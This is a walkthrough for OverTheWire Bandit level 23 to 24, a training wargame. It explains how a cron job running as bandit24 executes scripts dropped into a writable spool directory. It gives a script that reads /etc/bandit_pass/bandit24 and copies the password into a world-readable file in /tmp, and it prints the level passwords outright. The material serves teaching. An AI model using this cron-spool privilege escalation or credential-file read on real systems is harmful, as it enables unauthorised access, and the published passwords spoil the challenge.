# 🔓 Level 23 → Level 24 — Creating Your Own Shell Script

## 📊 Level Info

| Property | Value |
|----------|-------|
| **Host** | `bandit.labs.overthewire.org` |
| **Port** | `2220` |
| **Username** | `bandit23` |
| **Password** | `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga` (from Level 22) |

---

## 🎯 Challenge

> A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
>
> **NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
>
> **NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

**Commands you may need:** `chmod`, `cron`, `crontab`, `crontab(5)` (use "man 5 crontab" to access this)

---

## 🧠 Understanding the Challenge

This level requires you to create a shell script that will be executed by a cron job.

### The Setup

1. There's a cron job that runs a script in `/usr/bin/cronjob_bandit24.sh`
2. That script executes all scripts in `/var/spool/bandit24/` (or similar directory)
3. The cron job runs as `bandit24`
4. We can create a script in that directory that will be executed with bandit24's privileges

### The Goal

Create a script that:
1. Runs with bandit24's permissions
2. Reads the password from `/etc/bandit_pass/bandit24`
3. Saves it somewhere we can access (like `/tmp/`)

### Important Note

The script is removed after execution, so we need to:
- Create our script in the spool directory
- Make it executable
- Have it write the password to a location we control

---

## 💡 Solution

### Step 1: Connect to Level 23

```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```
Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
### Step 2: Look at the cron configuration
```bash

bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
```
Output:
```

@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```
### Step 3: Examine the script that cron runs
```bash

bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
```
Output:
```

#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
This script:

    Changes to /var/spool/bandit24/foo/

    Loops through all files in that directory

    Checks if the file is owned by bandit23 (us!)

    If so, executes it with a 60-second timeout

    Then deletes the file

### Step 4: Check the spool directory structure
```bash

bandit23@bandit:~$ ls -al /var/spool/bandit24/
total 12
dr-xr-x--- 3 bandit24 bandit23 4096 Apr  3 15:17 .
drwxr-xr-x 5 root     root     4096 Apr  3 15:17 ..
drwxrwx-wx 4 root     bandit24 4096 May 17 18:23 foo
```
The scripts need to go into /var/spool/bandit24/foo/
### Step 5: Create our script in a temporary directory

First, create a working directory in /tmp/:
```bash

bandit23@bandit:~$ mkdir -p /tmp/bandit24_work
bandit23@bandit:~$ cd /tmp/bandit24_work
```
Now create our script:
```bash

bandit23@bandit:/tmp/bandit24_work$ cat > get_pass.sh << 'EOF'
#!/bin/bash

# Copy the bandit24 password to a location we can read
cat /etc/bandit_pass/bandit24 > /tmp/bandit24_password

# Also make it readable by bandit23
chmod 644 /tmp/bandit24_password
EOF
```
### Step 6: Make the script executable
```bash

bandit23@bandit:/tmp/bandit24_work$ chmod +x get_pass.sh
```
### Step 7: Copy the script to the spool directory
```bash

bandit23@bandit:/tmp/bandit24_work$ cp get_pass.sh /var/spool/bandit24/foo/
```
### Step 8: Wait for cron to execute it (up to 1 minute)

The cron job runs every minute. Within 60 seconds, it will:

    Find our script

    Execute it as bandit24

    Delete it

### Step 9: Check for the password file

After waiting about 30-60 seconds:
```bash

bandit23@bandit:/tmp/bandit24_work$ ls -la /tmp/bandit24_password
```
Output:
```

-rw-r--r-- 1 bandit24 bandit24 33 May 17 19:11 /tmp/bandit24_password
```
```bash

bandit23@bandit:/tmp/bandit24_work$ cat /tmp/bandit24_password
```
Output:
```

gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

Step 10: Log into Level 24
```bash

ssh bandit24@bandit.labs.overthewire.org -p 2220
```
Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
